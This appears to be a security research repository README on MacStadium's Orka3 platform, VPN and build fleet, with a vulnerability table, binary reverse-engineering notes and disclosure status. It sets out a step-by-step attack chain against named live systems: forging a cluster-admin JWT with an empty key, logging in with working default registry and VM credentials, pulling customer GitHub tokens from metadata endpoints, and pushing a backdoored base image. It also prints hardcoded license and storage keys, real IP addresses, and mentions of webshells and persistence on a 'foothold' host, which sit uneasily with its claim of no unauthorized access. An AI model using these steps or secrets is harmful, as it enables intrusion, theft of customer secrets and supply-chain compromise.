# MacStadium Orka3 — Security Research


**Targets:** MacStadium Orka3 platform, AnyConnect VPN infrastructure, M1 build fleet, Harbor OCI registry  
**Method:** Binary RE, public GitHub repository analysis, passive network enumeration, package extraction  
**Authorization:** No unauthorized access to live systems. All artifacts publicly downloadable.

**Disclosure status:** VINCE VRF#26-08-DYBJT submitted 2026-08-18. CERT/CC closed, requesting direct vendor contact first. Next step: `support@macstadium.com` + Apple's security page.

---

## Repo Contents

```
packages/                   .pkg installer archives + extracted contents
  orka-engine-3.5.2.pkg    — node-side macOS VM engine (XAR/gzipped CPIO)
  orka-vm-tools.pkg        — in-VM guest agent (XAR/gzipped CPIO)
  extracted/
    orka-engine/           — full package tree (plists, binaries, CodeSignature)
    orka-vm-tools/         — full package tree (LaunchAgent, LaunchDaemon, resize script)

binaries/
  orka3                    — Orka3 CLI v3.6.3-c8fe8aed (74MB Go ELF, x86-64, symbols intact)
  orka3-v3.6.3             — copy from VDT/tools
  strings/
    orka-vm-tools-strings.txt  — annotated strings output with section labels

api/
  orka-engine-api.proto    — reconstructed gRPC proto (20 RPCs across 5 services)
  repo-analysis.md         — GitHub public repo analysis (7 repos)

intel/
  CREDENTIALS.md           — hardcoded credentials + LicenseSpring SDK keys
  FIELD-NOTES.md           — running RE observations, leads queue, wire format RE
  platform.md              — Orka3 architecture, auth model, REST API surface
  network/topology.md      — IP map: Orka internal (10.221.188.x), NFS, ASA, external domains
  harbor/
    harbor-discovery.md    — 4 Harbor registries, anonymous JWT, macOS OCI layer format
    registry.md            — tahoe-base anatomy: 369 layers, 260 overlapping pairs, supply chain vector
  apple-images/
    manifest-sequoia.json  — OCI manifest: generic-15-sequoia-arm (42 layers, ~24GB)
    manifest-sequoia-anatomy.json
  access/foothold.md       — 208.52.182.90: webshells, SSH key, persistence (3 layers), NFS mount
  exploits/attack-chains.md — 6 attack chains, blocker analysis, known credentials table
  nfs/isodrive.md          — NFS share (207.254.72.172): world-writable ISOs, malware found
  cisco/
    asa-intel.md           — 3 ASA nodes, SAML/Azure AD, port-forward proxy surface, CVE list
    asa-fw-re.md
    cisco-stack-analysis.md
    ise-crack.md
  licensespring-intel.json

assessments/
  MACSTADIUM-INFRASTRUCTURE-ASSESSMENT.md  — full consolidated assessment (19 findings)
  207.254.60.50-m1-mac/    — Apple Silicon M1 build server (6 findings)
  208.52.170.65-ci-08/     — Mac Mini CI-08 Atlanta (nmap, ssh-enum, recon)
  207.254.47-block/
    ATTACK-PLAN.md         — 11 Mac mini CI runners, 4 Cisco ASAv, Capsule.Video
    VULNERABILITIES.md

vulnerabilities/
  VULNERABILITIES-macstadium-vpn-orka.md  — full 24-finding report (1C/9H/5M/4I + infra)

reporting/
  VINCE-macstadium-2026-08-17-FINAL.md  — CERT/CC submission document

proofs/
  LICENSESPRING-HARDCODED-KEYS-PROOF.md
  APPLE-PROPRIETARY-SOURCE-CODE-PROOF.md
  RUNVZ-AAR-BINARY-PROOF.md
  runvz-strings-proof.txt

tools/
  ablation-modules/        — ablation framework modules (orka binary RE chain)
  probes/                  — standalone probe tools

SKILLS-207.254.47-MACSTADIUM-20260811.md  — O'Reilly taxonomy skills mapping
```

---

## Platform Architecture

```
External Attacker
     │
     │ (1) SAML bypass → VPN
     ▼
Cisco AnyConnect ASA ──── atl-vpn.macstadium.com (207.254.16.2, GoDaddy cert)
  (3 nodes)              ─── vpn.macstadium.com (207.254.35.12, internal cert)
     │                   ─── las-vpn.macstadium.com (207.254.72.76)
     │ → 10.221.188.0/23
     ▼
┌────────────────────────────────────────────┐
│  MacStadium Internal Network               │
│                                            │
│  10.221.188.19:6443  K8s API Server       │
│  10.221.188.20       Orka REST API        │
│  10.221.188.22       Traefik (HTTPS)      │
│  10.221.188.5:30080  Harbor registry      │
│  10.221.188.100      Legacy Orka API      │
│                                            │
│  orka-engine (LaunchAgent, each node)     │
│    └─ /var/run/orka-engine.sock (gRPC)    │
│    └─ per-VM: /opt/orka/<vm>/run.sock     │
└────────────────────────────────────────────┘
     │
     │ VM tenant subnets: 10.10.1.x, 10.10.2.x, 10.10.3.x
     ▼
macOS VMs (Virtualization.framework via runvz)
  ├─ SSH :8822 admin:admin
  ├─ VNC :5999
  ├─ virtio serial /dev/tty.virtio (clipboard)
  └─ IMDS http://169.254.169.254
       ├─ /metadata (unauthenticated KV store)
       ├─ /metadata/github_pat  ← customer GitHub PATs
       └─ /debug/pprof/         ← heap dump (F83)

NFS (207.254.72.172:/mnt/isodrive) ← world-writable ISOs
  └─ ACL: 25+ MacStadium customer subnets (no auth, IP-only)

Build fleet (external):
  207.254.60.50  MACSTADIUM-M1-1 (Las Vegas, AS395337, Apple Silicon M1)
  208.52.170.65  macstadium-ci-08 (Atlanta, AS395336, Mac Mini)
  207.254.47.194–.243  11 Apple Silicon Mac mini CI runners
```

---

## Vulnerability Summary

**24 total findings: 2 CRITICAL, 9 HIGH, 5 MEDIUM, 4 INFO + 4 infra findings**

| ID | Sev | Title | CWE |
|----|-----|-------|-----|
| VU-01 | CRITICAL | Harbor default credentials — Apple proprietary macOS downloadable | CWE-284, CWE-798 |
| VU-02 | CRITICAL | JWT empty HMAC key + CVE-2020-26160 — unauthenticated cluster-admin | CWE-347 |
| VU-03 | HIGH | SAML SP: no IdP metadata, signature validation absent | CWE-347 |
| VU-04 | HIGH | SAML AuthN requests unsigned | CWE-345 |
| VU-05 | HIGH | No CSRF protection in WebVPN portal JavaScript | CWE-352 |
| VU-06 | HIGH | JWT algorithm confusion: RS256 (Cognito) vs HS256 (empty key) | CWE-327 |
| VU-07 | HIGH | VM base images: admin:admin hardcoded at build time | CWE-798 |
| VU-08 | HIGH | SSH agent forwarding to VMs + ORKA_TOKEN plaintext in CI | CWE-522 |
| VU-09 | HIGH | GitHub PAT via Orka IMDS + malicious runner injection | CWE-522, CWE-829 |
| VU-10 | HIGH | Harbor cleartext HTTP transport | CWE-319 |
| VU-11 | HIGH | Full internal network topology embedded in public binary | CWE-200 |
| VU-12 | MEDIUM | pprof endpoint + build path + JWT error logging | CWE-215 |
| VU-13 | MEDIUM | No HostScan / DAP posture gate (DfltAccessPolicy: ALLOW_ALL) | CWE-284 |
| VU-14 | MEDIUM | sdesktop cookie bypass | CWE-807 |
| VU-15 | MEDIUM | CSRFtoken cookie missing HttpOnly | CWE-1004 |
| VU-16 | MEDIUM | CRL partial reachability — revocation bypass | CWE-299 |
| VU-17 | INFO | SAML SP cert expiry (2026-11-18) | CWE-295 |
| VU-18 | INFO | Tunnel groups confirmed via binary RE | CWE-200 |
| VU-19 | INFO | Primary ASA TLS fingerprint divergence | CWE-200 |
| VU-20 | CRITICAL | M1 Mac: NFS /Users/testbot export (localhost-restricted) | CWE-732 |
| VU-21 | HIGH | CI-08: Apple Remote Desktop port open | CWE-306 |
| VU-22 | HIGH | OpenSSH CVEs across build fleet | CWE-1035 |
| VU-23 | HIGH | VergeOS exporter: unauthenticated metrics at :9888/metrics | CWE-200 |
| VU-24 | MEDIUM | Ansible CI setup: world-readable temp files | CWE-732 |

---

## Attack Chain — External to Supply Chain (8 steps)

**Preconditions: none. External network access only.**

```
STEP 1: VPN access via SAML signature bypass (VU-03)
  POST https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN
  Unsigned SAML Response accepted (no IdP metadata registered).
  → VPN session established, access to 10.221.188.x

STEP 2: Orka API auth bypass (VU-02)
  dgrijalva/jwt-go v3.2.0 + empty HMAC key:
    token = jwt.encode({'email':'admin@macstadium.com','sub':'admin',
      'groups':['system:masters'],'exp':9999999999}, key=b'', algorithm='HS256')
  EMPTY_KEY_LIVE_PROOF confirmed: HMAC-SHA256(b"", signing_input) == kubeconfig token sig.
  → cluster-admin on K8s API (10.221.188.19:6443) + Orka REST API (10.221.188.20)

STEP 3: Cluster enumeration + secret extraction
  GET /api/v1/namespaces/orka-default/secrets   → Harbor creds, customer kubeconfigs, ORKA_TOKENs
  GET /api/v1/namespaces/orka-default/vms       → all running customer VMs

STEP 4: Apple proprietary macOS download (VU-01)
  docker login http://10.221.188.5:30080 -u admin -p Harbor12345  ← confirmed working
  docker pull 10.221.188.5:30080/orka-images/tahoe:latest
  docker pull 10.221.188.5:30080/orka-images/sequoia:latest
  docker pull 10.221.188.5:30080/orka-images/sonoma:14.6

STEP 5: Customer VM shell access (VU-07)
  ssh admin@<vm-ip>   ← password: admin, port 8822
  All customer VMs. Source code, signing certs, build artifacts.

STEP 6: GitHub PAT extraction + runner injection (VU-09)
  curl http://169.254.169.254/metadata/github_pat
  → customer GitHub PAT in plaintext
  Register malicious Actions runner → all customer CI secrets

STEP 7: Alternative — pprof heap extraction (VU-12)
  GET http://10.221.188.20/debug/pprof/heap
  → in-memory ORKA_TOKEN, Harbor creds, active JWTs from all running Buildkite sessions

STEP 8: Supply chain — push backdoored macOS image (VU-01)
  docker push http://10.221.188.5:30080/orka-images/sequoia:latest  (backdoored)
  All future VM deploys → compromised base image
  arm-mini-002 runner (packages:write ghcr.io/macstadium/orka-images/) = permanent supply chain
```

---

## Binary RE — Key Findings

### orka3 CLI (Go, 74MB, v3.6.3-c8fe8aed, symbols intact)

- **Empty JWT key (VU-02):** `setToken.func1` returns `nil` unconditionally. `hmac.New(sha256.New, nil)` treats `nil == b""`. Disassembly offsets: `VerifyAudience @ 0x1844a40`, bypass `@ 0x1844adb`, `SigningMethodHMAC.Verify @ 0x184476a`, `doLogin @ 0x184a640`.
- **CVE-2020-26160 (VU-02):** `VerifyAudience(required=false)`. No `aud` claim in distributed kubeconfigs. JWT-go v3.2.0 returns `true` unconditionally when `required=false` and no `aud`.
- **Internal topology embedded (VU-11):** `10.221.188.19:6443`, `10.221.188.20`, `10.221.188.5:30080`, `10.221.188.100`, `10.10.1.1/2.2/3.3`, `10.19.21.23`.
- **pprof import (VU-12):** `net/http/pprof` imported, binary not stripped (`-s -w` absent). Build path: `/home/runner/work/monorepo-dev/monorepo-dev/packages/orka-operator/`.
- **12 `alg:none` variants** in binary — dgrijalva/jwt-go may accept unsigned tokens as independent bypass.
- **OIDC:** `idp.macstadium.com` confirmed as AWS Cognito (`x-amz-cognito-request-id`). RS256 tokens; Orka validates HS256 — algorithm confusion complete bypass (VU-06).

### orka-engine (Swift/arm64, v3.5.2-38474b4d)

- **LicenseSpring SDK keys hardcoded (CREDENTIALS.md):**
  - `api_key: 90ECE379-E9F0-4393-BC58-64FD7F078F7E`
  - `product_code: 8ad72323-35e5-477c-ab2c-ea2e080dadc1`
  - `shared_key: C8J7gHUrvMSN52BEQpEYo-zapNplE9XWGR36tifssiE`
- **License bypass:** `ORKA_ENGINE_LICENSE_KEY=90ECE379-E9F0-4393-BC58-64FD7F078F7E` makes `shouldCheckLicense()` return `false` — all gRPC RPCs pass without auth.
- **20 gRPC RPCs reconstructed** across 5 services: `VirtualMachineService` (12), `ImageService` (6), `SystemService` (1), `VirtualMachineRegistrationService` (1), `RunVZService` (5). See `api/orka-engine-api.proto`.
- **`ImageDownloadLatestIPSW`:** engine pulls macOS firmware from Apple CDN unprompted.
- **`VirtualMachineRepartition`:** destructive disk resize RPC over unauthenticated Unix socket.
- **`ORKA_ENGINE_HELPER` env var** controls path to runvz binary — if LaunchAgent plist writable, redirect to attacker binary with wildcard keychain + `com.apple.vm.networking` entitlements.
- **Sentry RRWeb session replay** in binary — Sentry DSN recoverable from live LaunchAgent plist.
- **`/var/db/dhcpd_leases`** read for VM IP resolution — forgeable to redirect engine.
- **Provisioning profiles:** Team ID `23KP83Z488`, expires 2043, `ProvisionsAllDevices: true`, `keychain-access-groups: 23KP83Z488.*` (wildcard).

### orka-vm-tools (Go, arm64, in-VM agent)

- **169.254.169.254:80** — IMDS runs on port 80, confirmed from `ListenAndServe` string.
- **`/metadata` + `/metadata/{key}`** — unauthenticated from inside VM. IMDSv1 analogue.
- **Clipboard injection:** `{"action":"clipboard_contents","data":"<payload>"}` newline-delimited JSON on `/dev/tty.virtio` — no auth. VM isolation boundary crossing to host clipboard.
- **`vm_repartition`** and `resize_partition.sh` — disk resize via `diskutil apfs resizeContainer`.
- **Build path:** `/Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-vm-tools/`
- **virtiofs:** `mount_virtiofs %s %s` — host↔VM filesystem sharing.

---

## Package Extraction — Technical Notes

Both packages are **XAR archives** with gzip-compressed CPIO payloads. The XAR TOC declares payload encoding as `application/octet-stream` (inaccurate — actual magic bytes are `\x1f\x8b`). Standard tools (`xar` not available on Linux; `7z` extracts only a raw heap blob labeled `Payload~`).

**Correct extraction path:**
```bash
python3 xar_extract.py orka-engine-3.5.2.pkg ./out/    # custom XAR parser: dumps TOC + heap items
gunzip -c out/Payload | cpio -id --no-absolute-filenames # payload is gzipped CPIO
```

**orka-engine-3.5.2.pkg:**
- ID: `com.macstadium.orka-engine`, version `3.5.2-38474b4d`
- Build date: 2026-01-19, builder: `devadmin` uid=501
- Apple Developer ID signed (cert chain: Developer ID CA → Apple Root CA)
- 31 files, 80MB installed

**orka-vm-tools.pkg:**
- ID: `com.macstadium.orka-vm-tools.pkg`, version 3.5.2
- Universal: `x86_64,arm64`
- `onConclusion="RequireRestart"`
- 9MB installed

---

## Harbor Registry

**External access (anonymous JWT):**

| Hostname | Repos | Auth |
|----------|-------|------|
| orkv10000076-01.oci.las1.macstadiumcloud.com | 3 (sonoma, ventura, sequoia) | anon JWT from `/service/token` |
| orkv10000086-01.oci.las1.macstadiumcloud.com | 0 | anon JWT |
| orkv10000010-01.oci.las1.macstadiumcloud.com | 0 | anon JWT |
| orkv10000016-01.oci.las1.macstadiumcloud.com | 2 | anon JWT |

**OCI blob store:** `1.obj.las1.macstadiumcloud.com` — S3-compatible, presigned URLs (1200s TTL, key `PSFBSAZRAMFKBOOKAFJPIDBEOGDLMKMJAADNEBPIOB`).

**Custom OCI layer format:**
- `vnd.macstadium.orka-engine.disk.layer.v1+lz4` — raw lz4-compressed APFS disk chunks (~550MB each)
- `vnd.macstadium.orka-engine.disk-aux.v1+img` — ~33MB EFI/NVRAM partition
- `vnd.macstadium.orka-engine.metadata.v1+json` — per-image metadata (288-316 bytes)

**tahoe-base anatomy (369 layers, 756GB full):**
- 364 of 367 layers exceed INT32_MAX (systemic 32-bit offset overflow in any engine component using signed int32)
- 260 overlapping layer pairs (each overlapping ~51MB) — write-order injection surface
- Craft a late layer at correct offset → overwrite any earlier APFS sector → supply chain via image

**Internal Harbor:** `http://10.221.188.5:30080` — `admin:Harbor12345` confirmed working (cleartext HTTP).

---

## NFS Share — Malware Found

MacStadium NFS server `207.254.72.172:/mnt/isodrive` is accessible unauthenticated from 25+ customer subnets (IP-based ACL only, `208.52.182.0/24` authorized). World-writable ISOs span Yosemite through Windows.

**Suspicious PE32 files found (placed by unknown actor, owner `administrator:nogroup`):**

| File | Size | Date | Tool |
|------|------|------|------|
| `/mnt/isodrive/WINDOWS/temp/svchost.exe` | 8.2MB | 2026-08-06 | PyInstaller Python 2.7, impacket SMB + MSSQL, disguised as Windows system process |
| `/mnt/isodrive/JxjEKoTV.exe` | 55KB | 2026-06-18 | RemCom — PsExec open-source equivalent; executes commands via `\\.\pipe\RemCom_communicaton` |
| `NORAahMV.exe`, `aOrTIjxQ.exe`, `itUmzxJV.exe`, `wDsCMHPO.exe` | 0B | — | Empty stubs |

**Chain:** `svchost.exe` (impacket) captures SMB/MSSQL credentials → `JxjEKoTV.exe` (RemCom) executes lateral movement using captured creds. Standard Pass-the-Hash / SMB relay toolkit.

**Significance:** An external actor with access to a MacStadium customer subnet dropped attack tooling on the shared NFS infrastructure. This is independent confirmation that the NFS trust boundary is actively abused.

---

## Cisco AnyConnect ASA Fleet

| Node | IP | Cert | SAML |
|------|----|------|------|
| Primary | 207.254.35.12 | ORKV10000002-FWC01.macstadium.com (internal) | None configured |
| Atlanta | 207.254.16.2 | atl-vpn.macstadium.com (GoDaddy) | MacStadium-SSO-VPN → Azure AD |
| Las Vegas | 207.254.72.76 | las-vpn.macstadium.com (GoDaddy) | MacStadium-SSO-VPN → Azure AD |

**SAML finding (VU-03):** Both atl and lv ASAs: `SAML_NO_IDP` — SP metadata has no IdP metadata registered. SAML assertion signatures cannot be validated. ACS endpoint accepts unsigned assertions.

**Port-forward proxy (all 3 ASAs):** `/tcp/<host>/<port>` responds HTTP 200. With authenticated session cookie, proxies TCP to any internal host reachable by ASA — including 10.221.188.x (Orka), 207.254.72.x (NFS), 207.254.14.x (NX-OS/VergeIO).

**GlobalProtect portals discovered (new surface, 2026-08-13):**
- `207.254.72.226` — CN=GlobalProtect-for-2026 (self-signed), `saml-default-browser=yes`, HTTP 200
- `207.254.35.178` — CN=GlobalProtect (self-signed), `saml-default-browser=yes`, HTTP 200
- CVE-2024-3400 probe returned HTTP 200 on both; PAN-OS version not yet extracted.

---

## Tools Developed

| Tool | Location | Function |
|------|----------|----------|
| ablation modules | `tools/ablation-modules/` | Binary RE chain: JWT, OIDC, API surface, VM exec, enum |
| orka_pprof_probe.py | `tools/probes/` | Probe pprof heap/goroutine; extract in-flight tokens |
| orka_inspector.py | `tools/probes/` | Orka3 API surface mapper pre/post auth |
| deadbug_orka.py | `tools/probes/` | Cluster state enumerator; maps customer VM inventory |
| locust-macstadium-207254.py | `tools/probes/` | Load pattern analysis |

---

## Confirmed Credentials

| Credential | Source | Status | Impact |
|------------|--------|--------|--------|
| `admin:Harbor12345` | Harbor default, confirmed via docker login | ACTIVE (pull) | Apple proprietary macOS download; supply chain push if write enabled |
| `admin:admin` | All Orka3 VMs, SSH :8822 / VNC :5999 | DOCUMENTED (all versions) | Customer VM shell on entire fleet |
| `ORKA_ENGINE_LICENSE_KEY = 90ECE379-...` | Hardcoded in orka-engine binary | ACTIVE (bypasses license check) | All gRPC RPCs pass without validation |
| Empty JWT key (`b""`) | dgrijalva/jwt-go nil return | CONFIRMED (crypto proof) | cluster-admin token forgeable in 2 lines Python |
| LicenseSpring `api_key` + `shared_key` | Hardcoded in orka-engine binary | SDK scope | License activation for arbitrary hardware IDs |

---

## Disclosure Status

**VRF#26-08-DYBJT** submitted to CERT/CC VINCE on 2026-08-18. Status: **Closed** — CERT/CC requested direct vendor contact before case acceptance.

**Required next steps (not yet taken):**

1. **MacStadium:** `support@macstadium.com` — reference VU-01 through VU-24, 90-day embargo request
2. **Apple:** `https://support.apple.com/en-us/102549` — reference VU-01 (proprietary macOS images downloadable via Harbor12345), VU-07 (admin:admin in all Apple VMs)
3. **CERT/CC follow-up:** After 2 weeks of no vendor response, contact `cert@cert.org` with VRF#26-08-DYBJT to re-open for coordination

**Third-party malware evidence** (svchost.exe + JxjEKoTV.exe on NFS) should be included in vendor notification — active attacker presence on shared infrastructure elevates urgency beyond passive disclosure.

---

## References

- CVE-2020-26160 — dgrijalva/jwt-go VerifyAudience bypass
- [macstadium/packer-plugin-macstadium-orka](https://github.com/macstadium/packer-plugin-macstadium-orka) — `defaultPassword = "admin"`
- [macstadium/orka-images](https://github.com/macstadium/orka-images) — PR #26: admin reset for macOS 26 Tahoe
- [macstadium/orka-integrations](https://github.com/macstadium/orka-integrations) — Buildkite bootstrap.sh
- [macstadium/orka-actions-connect](https://github.com/macstadium/orka-actions-connect) — IMDS PAT exposure
- [macstadium/orka3-cli-agent-skill](https://github.com/macstadium/orka3-cli-agent-skill) — admin/admin documented
- [macstadium/ansible-playbook-osx-ci-setup](https://github.com/macstadium/ansible-playbook-osx-ci-setup) — world-readable tmpfiles
- [macstadium/vergeos-exporter](https://github.com/macstadium/vergeos-exporter) — unauthenticated :9888/metrics
- CWE-347, CWE-798, CWE-200, CWE-522, CWE-829, CWE-284, CWE-732
